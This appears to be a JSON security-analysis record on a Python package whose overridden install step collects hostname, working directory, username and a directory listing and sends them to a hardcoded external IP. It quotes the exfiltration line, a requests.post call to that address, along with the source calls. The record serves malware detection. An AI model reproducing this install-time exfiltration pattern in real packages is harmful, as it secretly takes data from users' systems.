  "purpose": "The code collects system information (hostname, current directory, username, directory listing) during package installation and exfiltrates it to an external IP address without user consent.",
  "sources": "subprocess.check_output(['ls']), socket.gethostname(), os.getcwd(), getpass.getuser()",
  "sinks": "requests.post('http://192.198.82.14:3000/log', data=ploads)",
  "flows": "collect system info -> send via HTTP POST to external server during install",
  "anomalies": "covert data collection and exfiltration during installation, hardcoded external IP, no user notification or encryption",
  "analysis": "The code overrides the install run method to execute 'ls', gather hostname, cwd, username, and directory listing, then transmits this data via an unencrypted HTTP POST request to a hardcoded external IP. This behavior indicates covert exfiltration of sensitive system information without user consent, fitting malicious activity. The code is straightforward, not obfuscated, and performs actions typical of spyware or backdoors. The external IP is a public address, and the transmission occurs during package installation, which is suspicious. The behavior aligns with malicious exfiltration rather than benign telemetry, and no legitimate purpose justifies such activity. The scores assigned in the reports (malware ~0.8, security risk ~0.9, obfuscation 0) are consistent with this analysis.",
  "conclusion": "The code exhibits malicious behavior by covertly collecting and transmitting system information during package installation. The activity is privacy-invasive, potentially malicious, and warrants high security concern. The scores assigned are justified and should be considered high, reflecting the severity of the exfiltration activity.",
